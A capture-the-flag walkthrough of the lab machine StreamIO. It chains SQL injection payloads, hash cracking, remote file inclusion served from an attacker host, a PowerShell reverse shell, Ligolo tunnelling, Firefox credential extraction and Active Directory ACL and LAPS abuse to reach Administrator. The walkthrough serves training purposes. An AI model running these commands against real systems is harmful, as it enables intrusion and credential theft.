Summary
#

StreamIO is a medium-difficulty Windows machine that begins with subdomain enumeration, leading to a SQL injection vulnerability that exposes user password hashes. After cracking the hashes, valid credentials provide access to the application’s administration panel, where parameter fuzzing and PHP filter abuse reveal the application’s source code. Analysis of the source uncovers a remote file inclusion vulnerability that is leveraged to achieve remote code execution. Following initial access, an internal MSSQL database is enumerated through a Ligolo tunnel to recover additional credentials used for lateral movement. Further local enumeration with WinPEAS reveals saved Firefox credentials, enabling access to another domain account. Finally, BloodHound identifies a privilege escalation path involving the Core Staff group and LAPS permissions, allowing retrieval of the local Administrator password and full system compromise.

SQL Injection & Credential Discovery
#

As the website is taking input and returning results for that particular input, it is possible that the input is being used in some sort of SQL query. Testing for SQL injection, we found that for the query “hour’; – - “, the results are reduced to the ones whose movie names end with the word “hour”. So possibly the SQL query performing the work behind the scenes is something like:

SELECT * FROM allMovies WHERE movieTitle LIKE %['input']%

By our SQL payload, the query’s logic is changed to:

SELECT * FROM allMovies WHERE movieTitle LIKE %['hour'; -- - ']%

To extract further information using SQLi, we can use UNION injections, but first we need to determine how many columns are returned by the query’s logic. From the front end, only 2 columns are shown, but there may be some in the backend database that are queried but not shown on the page. After trying the UNION injections testing for returned columns, the following payload worked:

qwerty' UNION SELECT 1,2,3,4,5,6; -- -

The output is returned for the 2nd and 3rd SELECT columns so our payloads to return data should be targeting these columns. After checking for the version using “SELECT @@version”, the version is identified as

Searching for MSSQL queries for enumerating the databases, tables and columns, we found the following queries:

To list all databases:

SELECT name FROM sys.databases;

To list all tables of a database:

SELECT TABLE_NAME FROM <DatabaseName>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';

To list all columns of a table of a database:

SELECT COLUMN_NAME FROM <DatabaseName>.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<TABLE_NAME>';

Enumerating the databases reveals six databases, four of which are MSSQL defaults.

qwerty' UNION SELECT 1,name,3,4,5,6 FROM sys.databases; -- -

From the remaining 2, I selected “STREAMIO” to further enumerate and list tables with the follwing:

qwerty' UNION SELECT 1,TABLE_NAME,3,4,5,6 FROM STREAMIO.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'; -- -

The payload resulted in tables “movies” & “users” for the STREAMIO database. Listing the columns of the users table with:

qwerty' UNION SELECT 1,COLUMN_NAME,3,4,5,6 FROM STREAMIO.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'; -- -

To list the data of username and password columns, we need to use a CONCAT query that outputs both columns in the 2nd column’s output as we can’t use the 3rd column because its type is int.

qwerty' UNION SELECT 1,username + ':' + password,3,4,5,6 FROM users; -- -

We can copy the results in a text file and use the following filter to output only the hashes for cracking with Hashcat:

└─$ cut -d':' -f2 username-hashes.txt | sed 's/^ *//' > hashes_only.txt

To crack the hashes with Hashcat, we will use MD5 mode (-m 0) as a 32-character hexadecimal hash is commonly indicative of MD5:

└─$ hashcat -m 0 hashes_only.txt /usr/share/wordlists/rockyou.txt

After fetching and analyzing the PHP code for master.php using PHP filters, we found a Remote File Inclusion leading to an arbitrary PHP code execution vulnerability in the last section of code:

<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>

When URL wrappers are enabled, file_get_contents() can retrieve content from remote locations. The code is then passing the file’s content to the eval function which executes it. The POST body parameter that fetches a file is “include”. To test for command injection, we can make a shell.php with code:

system("echo Hacked");

Open a python3 HTTP server to serve the payload file:

└─$ python3 -m http.server 8090

We can use curl to include the payload file as follows:

└─$ curl "https://streamio.htb/admin/?debug=master.php" -X POST -H "Cookie: PHPSESSID=<Cookie-Here>" -H "Content-Type: application/x-www-form-urlencoded" -d "include=http://<ATTACKER_IP>:8090/shell.php" --insecure

At the end of the response, we can see our injected word is echoed back. To get a reverse shell, we can make a PowerShell reverse shell payload from revshells.com. Select the payload type “PowerShell #3 (Base64)” from available options. Copy and paste the payload in place of “echo Hacked” in the shell.php and request again using curl. Make sure to first start the netcat listener:

rlwrap nc -lvnp <PORT>

Internal Network Enumeration
#

The MSSQL server is running internally and we have credentials for “db_admin”. We can reach the internal network using ligolo-ng for tunneling. We can download the latest compiled binaries from Link for Ligolo Linux Proxy and Ligolo Windows Agent. Download the files according to your system architecture. Apart from the agent, Windows also needs a Wintun driver for the correct working of Ligolo. We can download it from here. After all the files are downloaded, we can start the Ligolo Linux proxy server using:

└─$ ./proxy -selfcert

Transfer the Windows Ligolo agent and the wintun.dll driver to the target machine and run the agent:

.\agent.exe -connect <ATTACKER_IP>:11601 -retry -ignore-cert

Check the received connection in the proxy server. List the connections with “sessions”, type “1” and press enter. Now we need to create a tunnel interface and activate it with:

└─$ sudo ip tuntap add user $(whoami) mode tun dev ligolo

└─$ sudo ip link set ligolo up

Then start the tunnel in the proxy server with the “start” command and assign the route to the internal network of the machine with:

└─$ sudo ip route add 240.0.0.1/32 dev ligolo

Check if we can successfully reach the internal network by scanning the MSSQL port (1433) with Nmap:

└─$ nmap 240.0.0.1 -p 1433

If this works, we can use impacket-mssqlclient to connect to the MSSQL server using the already obtained db_admin credentials as follows:

└─$ impacket-mssqlclient ./db_admin:'<Password>'@240.0.0.1

Using SQL injection, we identified before that there were 2 non-default databases and we enumerated only one. Now as we have db_admin privileges, we can enumerate the 2nd (streamio_backup) and see what it contains. Select the database to use with “use streamio_backup”. We can list the tables with the query:

SQL (db_admin  db_admin@streamio_backup)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';

TABLE_NAME   
----------   
movies       
users

To enumerate columns of the “users” table:

SQL (db_admin  db_admin@streamio_backup)> SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';

COLUMN_NAME   DATA_TYPE   
-----------   ---------   
id            int         
username      nchar       
password      nchar

To output the columns’ data of the users table:

SQL (db_admin  db_admin@streamio_backup)> SELECT * FROM users;

We will get usernames along with their password hashes. The password hash of username “nikk37” is important, as it’s a domain user and also has a home profile in C:\Users. We can crack the hash with Hashcat using:

└─$ hashcat -m 0 '<hash-here>' /usr/share/wordlists/rockyou.txt

The hash is cracked and we can confirm the validity of the password using Netexec:

└─$ netexec smb 10.129.8.250 -u nikk37 -p '<password>'
SMB         10.129.8.250    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.8.250    445    DC               [+] streamIO.htb\nikk37:<REDACTED>

Now we can collect the Active Directory domain data using Bloodhound for analysis:

└─$ bloodhound-ce-python -c all -u 'nikk37' -p 'get_dem_girls2@yahoo.com' -d 'streamio.htb' -ns 10.129.8.159 --dns-tcp --zip --dns-timeout 90

Start the Bloodhound web GUI with “bloodhound-start” and import the zip file.

The “Outbound Object Control” section for nikk37 is blacked out, so this means our user has no privileges over other objects. To confirm this, we can use bloodyad:

└─$ bloodyad -u nikk37 -p '<password>' -d streamio.htb -i <TARGET_IP> get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=streamIO,DC=htb
permission: WRITE

distinguishedName: CN=nikk37,CN=Users,DC=streamIO,DC=htb
permission: WRITE

distinguishedName: DC=streamIO.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=streamIO,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.streamIO.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=streamIO,DC=htb
permission: CREATE_CHILD

There is no interesting AD privilege. As the user is in the “Remote Management Users” group, we can log in using evil-winrm:

└─$ evil-winrm -i <TARGEET_IP> -u 'nikk37' -p '<password>'

The user flag can be retrieved from the nikk37 desktop directory:

*Evil-WinRM* PS C:\Users\nikk37\Documents> type C:\Users\nikk37\Desktop\user.txt

Escalating Privileges
#

Local Enumeration
#

Checking for the user’s system privileges also didn’t yield anything interesting:

*Evil-WinRM* PS C:\Users\nikk37\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

We can transfer the winPEAS binary to the host for automated enumeration and run it with a command that shows the output on screen as well as saves it in a file:

*Evil-WinRM* PS C:\Users\nikk37\> .\winPEASx64.exe | Tee-Object -FilePath winPEASOutput.txt

The script identified that Firefox may contain saved credentials in the key4.db file and gave a link to the tool that can extract the credentials. The mentioned tool didn’t work, but after searching for another decryptor, I found one at the link. Download the tool to the attacker machine. The tool needs “key4.db” & “logins.json” to extract the credentials. As we have an evil-winrm session, we can download the files with:

*Evil-WinRM* PS C:\Users\nikk37\> download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db" ./

*Evil-WinRM* PS C:\Users\nikk37\> download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json" ./

Extract the credentials by pointing the tool to the directory where the two downloaded files are saved:

└─$ python3 firepwd.py -d /path/to/files

The extracted credentials can be seen at the bottom of the tool’s output. There are credentials for another domain user “JDgodd”. The password that worked for the JDgodd user is the password extracted for the user “admin”.

Active Directory Privilege Escalation
#

Analyzing the domain privileges of this user, we found out that it owns the “Core Staff” group as well as has WriteOwner privileges over it.

The mentioned group can then read the LAPS password on the DC computer.

We can assign JDgodd GenericAll privileges over the group with bloodyad:

└─$ bloodyad -u JDgodd -p '<password>' -d streamio.htb -i 10.129.8.250 add genericAll 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'JDgodd'

[+] JDgodd has now GenericAll on CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB

Now we can add ourselves to the group:

└─$ bloodyad -u JDgodd -p '<password>' -d streamio.htb -i 10.129.8.250 add groupMember 'Core Staff' 'JDgodd'                              
[+] JDgodd added to Core Staff

LAPS Abuse & Administrator Access
#

As we get the privilege to read the LAPS password on the DC computer by being the member of the group, we can use Netexec “laps” module to extract the password:

└─$ nxc ldap 10.129.8.250 -u JDgodd -p '<password>' -M laps

LDAP        10.129.8.250    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)                                                                                                                                                 
LDAP        10.129.8.250    389    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
LAPS        10.129.8.250    389    DC               [*] Getting LAPS Passwords
LAPS        10.129.8.250    389    DC               Computer:DC$ User:                Password:<REDACTED>

As the LAPS stores the local Administrator password, we can now log in to the target with the Administrator credentials using evil-winrm:

└─$ evil-winrm -i 10.129.8.250 -u 'Administrator' -p '<password>'
